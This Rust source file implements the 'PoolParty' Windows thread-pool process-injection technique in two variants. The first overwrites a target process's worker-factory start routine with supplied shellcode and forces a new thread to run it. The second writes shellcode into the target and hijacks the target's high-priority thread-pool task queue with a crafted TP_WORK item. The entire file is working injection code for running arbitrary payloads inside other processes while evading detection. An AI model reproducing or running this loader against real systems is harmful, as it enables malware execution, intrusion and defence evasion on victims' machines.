#![allow(non_upper_case_globals)]
#![allow(non_camel_case_types)]

use std::sync::atomic::AtomicI32;

use winapi::{
    ctypes::c_void,
    shared::{
        basetsd::SIZE_T, guiddef::GUID, ntdef::{HANDLE, LIST_ENTRY, NTSTATUS, NT_SUCCESS, PVOID}, ntstatus::{STATUS_ACCESS_DENIED, STATUS_NOT_FOUND}
    },
    um::{
        handleapi::{CloseHandle, DuplicateHandle},
        memoryapi::{ReadProcessMemory, VirtualAllocEx, WriteProcessMemory},
        processthreadsapi::{GetCurrentProcess, OpenProcess},
        winnt::{
            DUPLICATE_SAME_ACCESS, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, PROCESS_DUP_HANDLE, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE, RTL_SRWLOCK, TP_CALLBACK_PRIORITY, TP_CALLBACK_PRIORITY_HIGH
        },
    },
};

use ntapi::{
    ntexapi::{
        NtQueryInformationWorkerFactory,
        NtSetInformationWorkerFactory,
        WorkerFactoryBasicInformation,
        WORKER_FACTORY_BASIC_INFORMATION,
        WorkerFactoryThreadMinimum,
    },
    ntobapi::{
        NtQueryObject,
        ObjectTypeInformation,
        OBJECT_TYPE_INFORMATION,
    },
    ntpsapi::{
        NtQueryInformationProcess,
        ProcessHandleInformation,
    },
};

use winapi::um::threadpoolapiset::CreateThreadpoolWork;

#[repr(C)]
struct HandleEntry {
    handle_value: HANDLE,
    granted_access: u32,
}

#[repr(C)]
struct ProcessHandleInfo {
    number_of_handles: usize,
    handles: [HandleEntry; 1], // This is actually a flexible array
}

#[repr(C)]
struct TPP_REFCOUNT {
    refcount: AtomicI32,  // volatile INT32
}

#[repr(C)]
union TPP_POOL_QUEUE_STATE {
    exchange: i64,  // INT64
    data: std::mem::ManuallyDrop<TPP_POOL_QUEUE_STATE_DATA>,
}

#[repr(C)]
struct TPP_POOL_QUEUE_STATE_DATA {
    running_thread_goal: u16,     // INT32 :16
    pending_release_count: u16,   // UINT32 :16
    queue_length: u32,            // UINT32
}

#[repr(C)]
struct TPP_QUEUE {
    queue: LIST_ENTRY,
    lock: RTL_SRWLOCK,
}

#[repr(C)]
struct TPP_NUMA_NODE {
    worker_count: i32,  // INT32
}

#[repr(C)]
struct FULL_TP_POOL {
    refcount: TPP_REFCOUNT,
    padding_239: winapi::shared::ntdef::LONG,
    queue_state: TPP_POOL_QUEUE_STATE,
    task_queue: [*mut TPP_QUEUE; 3],
    numa_node: *mut TPP_NUMA_NODE,
    proximity_info: winapi::shared::ntdef::GROUP_AFFINITY,  // GROUP_AFFINITY*
    worker_factory: *mut c_void,
    completion_port: *mut c_void,
    lock: RTL_SRWLOCK,
    pool_object_list: LIST_ENTRY,

    worker_list: LIST_ENTRY,
    timer_queue: TPP_TIMER_QUEUE,
    shutdown_lock: RTL_SRWLOCK,
    shutdown_initiated: u8,
    released: u8,
    pool_flags: u16,
    padding_240: winapi::shared::ntdef::LONG,
    pool_links: LIST_ENTRY,
    alloc_caller: TPP_CALLER,
    release_caller: TPP_CALLER,
    available_worker_count: AtomicI32,     // volatile INT32
    long_running_worker_count: AtomicI32,  // volatile INT32
    last_proc_count: u32,                  // UINT32
    node_status: AtomicI32,               // volatile INT32
    binding_count: AtomicI32,             // volatile INT32
    flags: u32,  // Combined bitfields in one u32:
                 // bits 0..1:   CallbackChecksDisabled (1 bit)
                 // bits 1..12:  TrimTarget (11 bits)
                 // bits 12..23: TrimmedThrdCount (11 bits)
    selected_cpu_set_count: u32,
    padding_241: winapi::shared::ntdef::LONG,
    trim_complete: winapi::um::winnt::RTL_CONDITION_VARIABLE,
    trimmed_worker_list: LIST_ENTRY,
}

#[repr(C)]
struct TPP_TIMER_QUEUE {
    lock: RTL_SRWLOCK,
    absolute_queue: TPP_TIMER_SUBQUEUE,
    relative_queue: TPP_TIMER_SUBQUEUE,
    allocated_timer_count: i32,
    padding: [i32; 1],
}

#[repr(C)]
struct TPP_TIMER_SUBQUEUE {
    expiration: i64,              // INT64
    window_start: TPP_PH,         // struct _TPP_PH
    window_end: TPP_PH,          // struct _TPP_PH
    timer: *mut c_void,          // void*
    timer_pkt: *mut c_void,      // void*
    direct: TP_DIRECT,           // struct _TP_DIRECT
    expiration_window: u32,      // UINT32
    padding: [i32; 1],           // INT32 __PADDING__[1]
}

#[repr(C)]
struct TPP_CALLER {
    return_address: *mut c_void,  // void* ReturnAddress
}

#[repr(C)]
struct TPP_PH {
    root: *mut TPP_PH_LINKS,  // struct _TPP_PH_LINKS*
}

#[repr(C)]
struct TPP_PH_LINKS {
    siblings: LIST_ENTRY,    // struct _LIST_ENTRY Siblings
    children: LIST_ENTRY,    // struct _LIST_ENTRY Children
    key: i64,               // INT64 Key
}

#[repr(C)]
struct TP_DIRECT {
    task: TP_TASK,                         // struct _TP_TASK Task
    lock: u64,                             // UINT64 Lock
    io_completion_information_list: LIST_ENTRY,  // struct _LIST_ENTRY IoCompletionInformationList
    callback: *mut c_void,                 // void* Callback
    numa_node: u32,                        // UINT32 NumaNode
    ideal_processor: u8,                   // UINT8 IdealProcessor
    padding: [u8; 3],                      // char __PADDING__[3]
}

#[repr(C)]
struct TP_TASK {
    callbacks: *mut TP_TASK_CALLBACKS,  // struct _TP_TASK_CALLBACKS* Callbacks
    numa_node: u32,                     // UINT32 NumaNode
    ideal_processor: u8,                // UINT8 IdealProcessor
    padding_242: [u8; 3],              // char Padding_242[3]
    list_entry: LIST_ENTRY,            // struct _LIST_ENTRY ListEntry
}

#[repr(C)]
struct TP_TASK_CALLBACKS {
    execute_callback: *mut c_void,  // void* ExecuteCallback
    unposted: *mut c_void,         // void* Unposted
}

#[repr(C)]
union TPP_WORK_STATE {
    exchange: i32,            // INT32 Exchange
    bits: u32,               // Combined bitfields:
                            // bits 0..1:   Insertable (1 bit)
                            // bits 1..32:  PendingCallbackCount (31 bits)
}

#[repr(C)]
struct FULL_TP_WORK {
    cleanup_group_member: TPP_CLEANUP_GROUP_MEMBER,
    task: TP_TASK,
    work_state: TPP_WORK_STATE,
    padding: [i32; 1],
}

#[repr(C)]
struct TPP_CLEANUP_GROUP_MEMBER {
    refcount: TPP_REFCOUNT,
    padding_233: winapi::shared::ntdef::LONG,
    vfuncs: *const c_void,
    cleanup_group: *mut c_void,
    cleanup_group_cancel_callback: *mut c_void,
    finalization_callback: *mut c_void,
    cleanup_group_member_links: LIST_ENTRY,
    callback_barrier: TPP_BARRIER,
    callback: TPP_CALLBACK,
    context: *mut c_void,
    activation_context: *mut c_void,
    sub_process_tag: *mut c_void,
    activity_id: GUID,
    work_on_behalf_ticket: ALPC_WORK_ON_BEHALF_TICKET,
    race_dll: *mut c_void,
    pool: *mut FULL_TP_POOL,
    pool_object_links: LIST_ENTRY,
    flags: TPP_CLEANUP_FLAGS,
    padding_234: winapi::shared::ntdef::LONG,
    alloc_caller: TPP_CALLER,
    release_caller: TPP_CALLER,
    callback_priority: TP_CALLBACK_PRIORITY,
    padding: [i32; 1],

    //rest of fields
}

#[repr(C)]
union TPP_CLEANUP_FLAGS {
    flags: std::mem::ManuallyDrop<AtomicI32>,     // volatile INT32 Flags
    bits: u32,           // Combined bitfields:
                        // bits 0..1:   LongFunction (1 bit)
                        // bits 1..2:   Persistent (1 bit)
                        // bits 2..16:  UnusedPublic (14 bits)
                        // bits 16..17: Released (1 bit)
                        // bits 17..18: CleanupGroupReleased (1 bit)
                        // bits 18..19: InCleanupGroupCleanupList (1 bit)
                        // bits 19..32: UnusedPrivate (13 bits)
}

#[repr(C)]
struct ALPC_WORK_ON_BEHALF_TICKET {
    thread_id: u32,                    // UINT32 ThreadId
    thread_creation_time_low: u32,     // UINT32 ThreadCreationTimeLow
}

#[repr(C)]
struct TPP_BARRIER {
    ptr: TPP_FLAGS_COUNT,           // volatile union
    wait_lock: RTL_SRWLOCK,         // Already have from winapi
    wait_list: TPP_ITE,
}

#[repr(C)]
union TPP_FLAGS_COUNT {
    data: i64,           // INT64 Data
    bits: u64,          // Combined bitfields:
                        // bits 0..60: Count (60 bits)
                        // bits 60..64: Flags (4 bits)
}

#[repr(C)]
struct TPP_ITE {
    first: *mut c_void,  // struct _TPP_ITE_WAITER* First
}

#[repr(C)]
union TPP_CALLBACK {
    callback: *mut c_void,
    work_callback: *mut c_void,
    simple_callback: *mut c_void,
    timer_callback: *mut c_void,
    wait_callback: *mut c_void,
    io_callback: *mut c_void,
    alpc_callback: *mut c_void,
    alpc_callback_ex: *mut c_void,
    job_callback: *mut c_void,
}

pub fn wrapper(shellcode: &[u8], pid: u32, variant: u32) -> String {
    match variant {
        1 => party_time(shellcode, pid),
        2 => party_time_2(shellcode, pid),
        _ => panic!("Invalid variant number. Please provide a valid number."),
    }
}


fn party_time(shellcode: &[u8], pid: u32) -> String {
    //println!("Hello, world!");
    //get handle to target process
    let process_handle = get_target_process_handle(pid);
    if process_handle.is_null() {
        return format!("Failed to open process {}", pid);
    }
    
    //println!("Process handle: {:?}", process_handle);
    //instead of printing, collect info into a string to return at the end
    let mut info_string = String::new();
    info_string.push_str(&format!("Process handle: {:?}\n", process_handle));

    //find worker factory handle
    let worker_factory_handle = match find_worker_factory_handle(process_handle) {
        Ok(handle) => {
            // Success case - continue with the handle
            handle
        },
        Err(status) => {
            // Error case - return error message
            return format!("Failed to find worker factory handle. Status: {:#x}", status);
        }
    };
    //println!("Worker factory handle: {:?}", worker_factory_handle);
    info_string.push_str(&format!("Worker factory handle: {:?}\n", worker_factory_handle));

    //get worker factory basic info
    let worker_factory_basic_info = match get_worker_factory_basic_info(worker_factory_handle) {
        Ok(info) => info,
        Err(status) => {
            return format!("Failed to get worker factory basic info. Status: {:#x}", status);
        }
    };
    //println!("Worker factory basic info start routine address: {:?}", worker_factory_basic_info.StartRoutine);
    info_string.push_str(&format!("Worker factory basic info start routine address: {:?}\n", worker_factory_basic_info.StartRoutine));

    //write shellcode to the existing start routine address
    let status = write_shellcode_to_memory(process_handle, worker_factory_basic_info.StartRoutine as *mut c_void, shellcode);
    if !NT_SUCCESS(status) {
        return format!("Failed to write shellcode to the existing start routine address. Status: {:x}", status);
    }

    //print success message
    //println!("Shellcode written to the existing start routine address.");
    info_string.push_str(&format!("Shellcode written to the existing start routine address.\n"));

    //Trigger execution by increasing minimum thread count
    let status = setup_execution(worker_factory_handle, &worker_factory_basic_info);
    if !NT_SUCCESS(status) {
        return format!("Failed to trigger shellcode execution. Status: {:x}", status);
    }

    //println!("Execution triggered successfully.");
    info_string.push_str(&format!("Execution triggered successfully.\n"));

    info_string
}

fn get_target_process_handle(pid: u32) -> HANDLE {

    let process_handle = unsafe { OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, 0, pid) };
    process_handle
}

fn find_worker_factory_handle(process_handle: HANDLE) -> Result<HANDLE, NTSTATUS> {
    let mut _buffer_size: usize = 1024 * 1024; // 1MB initial buffer
    let mut handle_info: Vec<u8> = vec![0u8; _buffer_size];
    let mut return_length: u32 = 0;
    
    // Query process handle information
    unsafe {
        let status = NtQueryInformationProcess(
            process_handle,
            ProcessHandleInformation,
            handle_info.as_mut_ptr() as _,
            handle_info.capacity() as u32,
            &mut return_length,
        );

        //println!("Query status: {:x}, return length: {}", status, return_length);
        
        if !NT_SUCCESS(status) {
            return Err(status);
        }

    }

    let handle_snapshot = handle_info.as_ptr() as *const ProcessHandleInfo;
        let handles = unsafe { std::slice::from_raw_parts(
            &(*handle_snapshot).handles as *const HandleEntry,
            (*handle_snapshot).number_of_handles
        ) };
        //println!("Number of handles: {}", handles.len());

        for handle_entry in handles {
            let mut duplicated_handle: HANDLE = std::ptr::null_mut();
    
        // Try to duplicate the handle
        let dup_result = unsafe {
            DuplicateHandle(
                process_handle,
                handle_entry.handle_value,
                GetCurrentProcess(),
                &mut duplicated_handle,
                0,
                0,
                DUPLICATE_SAME_ACCESS,
            )
        };
        
        if dup_result == 0 {
            continue;
        }

        // Get size needed for object info
        let mut type_info_len = 0;
        let _ = unsafe { NtQueryObject(
            duplicated_handle,
            ObjectTypeInformation,
            std::ptr::null_mut(),
            0,
            &mut type_info_len
        ) };

        // Get actual object info
        let mut type_info = vec![0u8; type_info_len as usize];
        let status = unsafe { NtQueryObject(
            duplicated_handle,
            ObjectTypeInformation,
            type_info.as_mut_ptr() as PVOID,
            type_info_len,
            std::ptr::null_mut()
        ) };

        if NT_SUCCESS(status) {
            let type_info = type_info.as_ptr() as *const OBJECT_TYPE_INFORMATION;
            let type_name = unsafe { std::slice::from_raw_parts(
                (*type_info).TypeName.Buffer as *const u16,
                (*type_info).TypeName.Length as usize / 2
            ) };

            if let Ok(name) = String::from_utf16(type_name) {
                if name == "TpWorkerFactory" {
                    return Ok(duplicated_handle);
                }
            }
        }

        unsafe { CloseHandle(duplicated_handle) };
    }

    Err(STATUS_NOT_FOUND)
}
    
fn get_worker_factory_basic_info(worker_factory_handle: HANDLE) -> Result<WORKER_FACTORY_BASIC_INFORMATION, NTSTATUS> {
    let mut basic_info: WORKER_FACTORY_BASIC_INFORMATION = unsafe { std::mem::zeroed() };

    let status = unsafe { NtQueryInformationWorkerFactory(
        worker_factory_handle,
        WorkerFactoryBasicInformation,
        &mut basic_info as *mut _ as *mut c_void,  // Cast to raw pointer
        std::mem::size_of::<WORKER_FACTORY_BASIC_INFORMATION>() as u32,
        std::ptr::null_mut()
    ) };

    if !NT_SUCCESS(status) {
        return Err(status);
    }

    Ok(basic_info)
}

fn write_shellcode_to_memory(process_handle: HANDLE, start_routine_address: *mut c_void, shellcode: &[u8]) -> NTSTATUS {
    let write_result = unsafe { WriteProcessMemory(
        process_handle,
        start_routine_address,
        shellcode.as_ptr() as *const c_void,
        shellcode.len() as SIZE_T,
        std::ptr::null_mut()
    ) };

    if write_result == 0 {
        return STATUS_ACCESS_DENIED;
    }

    0 // Return success status (0)
}

fn setup_execution(worker_factory_handle: HANDLE, basic_info: &WORKER_FACTORY_BASIC_INFORMATION) -> NTSTATUS {
    // Set minimum thread count to current + 1 to force creation of new thread
    let min_thread_count: u32 = basic_info.TotalWorkerCount + 1; // Using TotalWorkerCount instead
    
    let status = unsafe {
        NtSetInformationWorkerFactory(
            worker_factory_handle,
            WorkerFactoryThreadMinimum,
            &min_thread_count as *const _ as *mut c_void,
            std::mem::size_of::<u32>() as u32
        )
    };

    if !NT_SUCCESS(status) {
        panic!("Failed to set worker factory thread minimum. Status: {:x}", status);
    }

    status
}

fn party_time_2(shellcode: &[u8], pid: u32) -> String {
    // Get handle to target process
    let process_handle = get_target_process_handle(pid);
    //println!("Process handle: {:?}", process_handle);
    let mut info_string = String::new();
    info_string.push_str(&format!("Process handle: {:?}\n", process_handle));

        // Allocate memory for shellcode
        //later we should change this to allocate RW then change to RX after writing shellcode
        //but to get it working, we'll copy how the example does it
        let shellcode_address = unsafe {
            let addr = VirtualAllocEx(
                process_handle,
                std::ptr::null_mut(),
                shellcode.len(),
                MEM_COMMIT,
                PAGE_EXECUTE_READ
            );
            if addr.is_null() {
                return format!("Failed to allocate memory for shellcode");
            }
            addr

        };
        //println!("Allocated memory for shellcode at: {:?}", shellcode_address);
        info_string.push_str(&format!("Allocated memory for shellcode at: {:?}\n", shellcode_address));
    

        // Write shellcode to allocated memory
        let status = write_shellcode_to_memory(process_handle, shellcode_address, shellcode);
        if !NT_SUCCESS(status) {
            return format!("Failed to write shellcode. Status: {:x}", status);
        }
        //println!("Wrote shellcode to memory");

        info_string.push_str(&format!("Wrote shellcode to memory\n"));


    // Find worker factory handle
    let worker_factory_handle = match find_worker_factory_handle(process_handle) {
        Ok(handle) => {
            // Success case - continue with the handle
            handle
        },
        Err(status) => {
            // Error case - return error message
            return format!("Failed to find worker factory handle. Status: {:#x}", status);
        }
    };
    //println!("Worker factory handle: {:?}", worker_factory_handle);
    info_string.push_str(&format!("Worker factory handle: {:?}\n", worker_factory_handle));


    // Get worker factory basic info
    let worker_factory_basic_info = match get_worker_factory_basic_info(worker_factory_handle) {
        Ok(info) => info,
        Err(status) => {
            return format!("Failed to get worker factory basic info. Status: {:#x}", status);
        }
    };

       // Read the TP_POOL structure from the target process
       let mut tp_pool: FULL_TP_POOL = unsafe { std::mem::zeroed() };
       //let tp_pool_address = worker_factory_basic_info.StartParameter as *mut c_void;

       unsafe {
           let mut bytes_read: SIZE_T = 0;
           let read_result = ReadProcessMemory(
               process_handle,
               worker_factory_basic_info.StartParameter,
               &mut tp_pool as *mut _ as *mut c_void,
               std::mem::size_of::<FULL_TP_POOL>(),
               &mut bytes_read

           );
           
           if read_result == 0 {
               return format!("Failed to read TP_POOL structure from target process");
           }
           

           // Debug the actual data we read
           //println!("Bytes read from TP_POOL: {}", bytes_read);
           //println!("TP_POOL refcount: {:?}", tp_pool.refcount.refcount);
           //println!("Task queue pointers:");
           //for (i, queue) in tp_pool.task_queue.iter().enumerate() {
           //    println!("Queue {}: {:?}", i, *queue);
           //}

       }
       
       //println!("Read target process's TP_POOL structure into the current process");
       info_string.push_str(&format!("Read target process's TP_POOL structure into the current process\n"));


    // Add at the start of party_time_2 or after reading TP_POOL:
    //println!("Structure sizes:");
    //println!("  FULL_TP_POOL: {} bytes", std::mem::size_of::<FULL_TP_POOL>());
    //println!("  TPP_TIMER_QUEUE: {} bytes", std::mem::size_of::<TPP_TIMER_QUEUE>());

    //println!("  TPP_QUEUE: {} bytes", std::mem::size_of::<TPP_QUEUE>());


    //println!("\nKey field offsets in FULL_TP_POOL:");
    //println!("  task_queue: {:#x}", std::mem::offset_of!(FULL_TP_POOL, task_queue));
    //println!("  timer_queue: {:#x}", std::mem::offset_of!(FULL_TP_POOL, timer_queue));

    //println!("  pool_links: {:#x}", std::mem::offset_of!(FULL_TP_POOL, pool_links));
    //println!("  flags: {:#x}", std::mem::offset_of!(FULL_TP_POOL, flags));


    // Get pointer to high priority queue's LIST_ENTRY
    let high_priority_queue_list = unsafe {
        &(*tp_pool.task_queue[TP_CALLBACK_PRIORITY_HIGH as usize]).queue
    };
    //println!("High priority queue LIST_ENTRY at: {:p}", high_priority_queue_list);
    info_string.push_str(&format!("High priority queue LIST_ENTRY at: {:p}\n", high_priority_queue_list));


    // Create TP_WORK structure using Windows API
    let tp_work = unsafe {
        CreateThreadpoolWork(
            Some(std::mem::transmute(shellcode_address)),
            std::ptr::null_mut(),
            std::ptr::null_mut()
        )
    };
    //println!("Created TP_WORK structure associated with the shellcode");
    info_string.push_str(&format!("Created TP_WORK structure associated with the shellcode\n"));


    // Cast tp_work to our FULL_TP_WORK type and modify it
    let tp_work = tp_work as *mut FULL_TP_WORK;
    unsafe {
        (*tp_work).cleanup_group_member.pool = worker_factory_basic_info.StartParameter as *mut FULL_TP_POOL;
        (*tp_work).task.list_entry.Flink = high_priority_queue_list as *const _ as *mut _;
        (*tp_work).task.list_entry.Blink = high_priority_queue_list as *const _ as *mut _;
        (*tp_work).work_state.exchange = 0x2;
    }
    //println!("Modified the TP_WORK structure to be associated with target process's TP_POOL");
    info_string.push_str(&format!("Modified the TP_WORK structure to be associated with target process's TP_POOL\n"));

    // Add debug prints to verify values
    /* 
    unsafe {
        println!("TP_WORK values:");
        println!("  Pool pointer: {:p}", (*tp_work).cleanup_group_member.pool);
        println!("  List Flink: {:p}", (*tp_work).task.list_entry.Flink);
        println!("  List Blink: {:p}", (*tp_work).task.list_entry.Blink);
        println!("  Work state: {:#x}", (*tp_work).work_state.exchange);
    }
    */

        // Allocate memory for TP_WORK in target process
        let remote_tp_work = unsafe {
            VirtualAllocEx(
                process_handle,
                std::ptr::null_mut(),
                std::mem::size_of::<FULL_TP_WORK>(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE
            )
        };
        //println!("Allocated TP_WORK memory in target process at: {:p}", remote_tp_work);
        info_string.push_str(&format!("Allocated TP_WORK memory in target process at: {:p}\n", remote_tp_work));

            // Write our TP_WORK to the allocated memory in target process
    unsafe {
        WriteProcessMemory(
            process_handle,
            remote_tp_work,
            tp_work as *const c_void,
            std::mem::size_of::<FULL_TP_WORK>(),
            std::ptr::null_mut()
        );
    }
    //println!("Written the specially crafted TP_WORK structure to the target process");
    info_string.push_str(&format!("Wrote the specially crafted TP_WORK structure to the target process\n"));

    // Get pointer to remote work item's task list entry
    let remote_work_item_task_list = unsafe {
        &(*(remote_tp_work as *mut FULL_TP_WORK)).task.list_entry
    };
    //println!("Remote work item task list entry at: {:p}", remote_work_item_task_list);
    info_string.push_str(&format!("Remote work item task list entry at: {:p}\n", remote_work_item_task_list));

        // Update the queue's Flink and Blink to point to our remote work item
        unsafe {
            WriteProcessMemory(
                process_handle,
                &(*tp_pool.task_queue[TP_CALLBACK_PRIORITY_HIGH as usize]).queue.Flink as *const _ as *mut c_void,
                &remote_work_item_task_list as *const _ as *const c_void,
                std::mem::size_of::<*mut LIST_ENTRY>(),
                std::ptr::null_mut()
            );
            WriteProcessMemory(
                process_handle,
                &(*tp_pool.task_queue[TP_CALLBACK_PRIORITY_HIGH as usize]).queue.Blink as *const _ as *mut c_void,
                &remote_work_item_task_list as *const _ as *const c_void,
                std::mem::size_of::<*mut LIST_ENTRY>(),
                std::ptr::null_mut()
            );
        }
        //println!("Modified the target process's TP_POOL task queue list entry to point to the specially crafted TP_WORK");
        info_string.push_str(&format!("Modified the target process's TP_POOL task queue list entry to point to the specially crafted TP_WORK\n"));

        info_string

}



